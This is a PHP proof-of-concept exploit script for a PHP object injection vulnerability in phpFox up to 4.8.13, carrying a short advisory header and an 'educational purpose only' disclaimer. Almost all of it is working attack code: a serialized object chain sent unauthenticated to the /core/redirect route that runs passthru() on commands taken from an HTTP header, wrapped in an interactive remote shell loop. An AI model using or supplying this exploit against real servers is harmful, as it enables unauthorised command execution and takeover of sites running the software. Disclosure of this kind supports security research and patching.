php
/\*
--------------------------------------------------------------
phpFox <= 4.8.13 (redirect) PHP Object Injection Vulnerability
--------------------------------------------------------------
author..............: Egidio Romano aka EgiX
mail................: n0b0d13s[at]gmail[dot]com
software link.......: https://www.phpfox.com
+-------------------------------------------------------------------------+
| This proof of concept code was written for educational purpose only. |
| Use it at your own risk. Author will be not responsible for any damage. |
+-------------------------------------------------------------------------+
[-] Vulnerability Description:
User input passed through the "url" request parameter to the /core/redirect route is
not properly sanitized before being used in a call to the unserialize() PHP function.
This can be exploited by remote, unauthenticated attackers to inject arbitrary PHP
objects into the application scope, allowing them to perform a variety of attacks,
such as executing arbitrary PHP code.
[-] Original Advisory:
https://karmainsecurity.com/KIS-2023-12
\*/
set\_time\_limit(0);
error\_reporting(E\_ERROR);
if (!extension\_loaded("curl")) die("[+] cURL extension required!\n");
print "+------------------------------------------------------------------+\n";
print "| phpFox <= 4.8.13 (redirect) PHP Object Injection Exploit by EgiX |\n";
print "+------------------------------------------------------------------+\n";
if ($argc != 2) die("\nUsage: php $argv[0] <URL\n\n");
function encode($string)
{
$string = addslashes(gzcompress($string, 9));
return urlencode(strtr(base64\_encode($string), '+/=', '-\_,'));
}
class Phpfox\_Request
{
private $\_sName = "EgiX";
private $\_sPluginRequestGet = "print '\_\_\_\_\_'; passthru(base64\_decode(\$\_SERVER['HTTP\_CMD'])); print '\_\_\_\_\_'; die;";
}
class Core\_Objectify
{
private $\_\_toString;
function \_\_construct($callback)
{
$this->\_\_toString = $callback;
}
}
print "\n[+] Launching shell on {$argv[1]}\n";
$popChain = serialize(new Core\_Objectify([new Phpfox\_Request, "get"]));
$popChain = str\_replace('Core\_Objectify', 'Core\Objectify', $popChain);
$ch = curl\_init();
curl\_setopt($ch, CURLOPT\_URL, "{$argv[1]}index.php/core/redirect");
curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, true);
curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, false);
curl\_setopt($ch, CURLOPT\_POSTFIELDS, "url=".encode($popChain));
while(1)
{
print "\nphpFox-shell# ";
if (($cmd = trim(fgets(STDIN))) == "exit") break;
curl\_setopt($ch, CURLOPT\_HTTPHEADER, ["CMD: ".base64\_encode($cmd)]);
preg\_match("/\_\_\_\_\_(.\*)\_\_\_\_\_/s", curl\_exec($ch), $m) ? print $m[1] : die("\n[+] Exploit failed!\n");
}
